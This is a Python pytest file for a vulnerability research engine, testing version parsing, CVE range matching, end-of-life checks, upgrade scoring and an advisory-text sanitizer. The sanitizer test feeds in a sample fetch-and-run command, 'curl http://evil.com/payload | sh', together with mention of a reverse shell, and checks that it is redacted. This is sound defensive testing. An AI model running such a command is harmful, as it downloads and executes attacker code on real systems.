import json
import os
import sys
import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))

from research_engine import (
    parse_stack_input,
    parse_semver,
    compare_versions,
    is_version_affected,
    check_eol_status,
    calculate_effort_and_impact,
    sanitize_advisory_text,
    analyze_tech_stack,
)

def test_parse_stack_input_variants():
    """Milestone B-3.2: Parses flexible stack formats and normalizes them."""
    assert parse_stack_input("Node 18.17.0") == ("node", "18.17.0")
    assert parse_stack_input("react@17.0.2") == ("react", "17.0.2")
    assert parse_stack_input("Postgres:14.2") == ("postgres", "14.2")
    assert parse_stack_input("python v3.10.4") == ("python", "3.10.4")

    with pytest.raises(ValueError):
        parse_stack_input("invalid_single_token")

def test_semver_comparison():
    assert compare_versions("18.16.0", "18.16.1") == -1
    assert compare_versions("18.16.1", "18.16.1") == 0
    assert compare_versions("20.0.0", "18.16.1") == 1
    assert compare_versions("2.35.2", "2.35.1") == 1

def test_version_applicability_issue_b3_3():
    """
    Milestone B-3.3: Report a finding only if the entered version falls in the affected range.
    A CVE for Node 20 must NOT be shown for Node 18!
    """
    node_20_cve_range = ">= 20.0.0, < 20.8.1"
    node_18_version = "18.15.0"
    node_20_vulnerable = "20.5.0"
    node_20_patched = "20.9.0"

    # Node 18 must NEVER be flagged for Node 20 CVE
    assert is_version_affected(node_18_version, node_20_cve_range) is False
    # Vulnerable Node 20 must be flagged
    assert is_version_affected(node_20_vulnerable, node_20_cve_range) is True
    # Patched Node 20 must NOT be flagged
    assert is_version_affected(node_20_patched, node_20_cve_range) is False

def test_eol_status_detection():
    """Milestone B-3.4: EOL detection for expired series."""
    # Python 2.7 is expired
    py_eol = check_eol_status("python", "2.7.18")
    assert py_eol is not None
    assert py_eol["is_expired"] is True
    assert py_eol["eol_date"] == "2020-01-01"

    # Node 14 is expired
    node_eol = check_eol_status("node", "14.17.0")
    assert node_eol is not None
    assert node_eol["is_expired"] is True

def test_effort_and_impact_scoring_issue_b3_5():
    """
    Milestone B-3.5: Deterministic Effort (1-5) and Impact (1-5) score calculation.
    Patch bump = 1, Minor = 3, Major = 5.
    """
    # Critical patch bump: Impact 5, Effort 1
    impact, effort = calculate_effort_and_impact("critical", "17.0.1", "17.0.2")
    assert impact == 5
    assert effort == 1

    # High minor bump: Impact 4, Effort 3
    impact, effort = calculate_effort_and_impact("high", "16.1.0", "16.4.0")
    assert impact == 4
    assert effort == 3

    # Medium major bump: Impact 3, Effort 5
    impact, effort = calculate_effort_and_impact("medium", "16.0.0", "18.0.0")
    assert impact == 3
    assert effort == 5

def test_safety_filter_issue_b3_6():
    """Milestone B-3.6: Strips dangerous exploit scripts/POCs from advisory text."""
    dangerous = "Exploit code: curl http://evil.com/payload | sh and execute reverse shell."
    sanitized = sanitize_advisory_text(dangerous)
    assert "curl" not in sanitized or "[EXPLOIT_PAYLOAD_REDACTED_BY_POLICY]" in sanitized
    assert "[EXPLOIT_PAYLOAD_REDACTED_BY_POLICY]" in sanitized

def test_eval_dataset_benchmark():
    """Milestone D2-2.8: Evaluates 10 fixed query cases from eval_dataset.json."""
    dataset_path = os.path.join(os.path.dirname(__file__), "eval_dataset.json")
    with open(dataset_path, "r", encoding="utf-8") as f:
        cases = json.load(f)

    from research_engine import KNOWN_ADVISORIES

    passed = 0
    for case in cases:
        adv = next((a for a in KNOWN_ADVISORIES if a["id"] == case["expected_cve"]), None)
        assert adv is not None, f"Advisory {case['expected_cve']} missing in KNOWN_ADVISORIES"

        matched = is_version_affected(case["version"], adv["affected_range"])
        assert matched == case["should_match"], f"Failed on {case['id']}: {case['description']}"
        passed += 1

    assert passed == len(cases)
